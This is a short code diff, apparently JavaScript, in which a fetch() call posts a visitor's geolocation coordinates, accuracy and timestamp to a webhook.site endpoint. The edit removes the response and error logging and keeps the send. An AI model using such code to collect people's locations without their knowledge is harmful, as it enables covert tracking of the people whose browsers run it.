@@ -18,11 +18,6 @@ fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
     longitude: position.coords.longitude,
     accuracy: position.coords.accuracy,
     timestamp: new Date().toISOString()
-  })
-})
-.then(res => res.text())
-.then(res => console.log("Response from webhook:", res))
-.catch(err => console.error("Error sending data:", err));
         })
       });
 
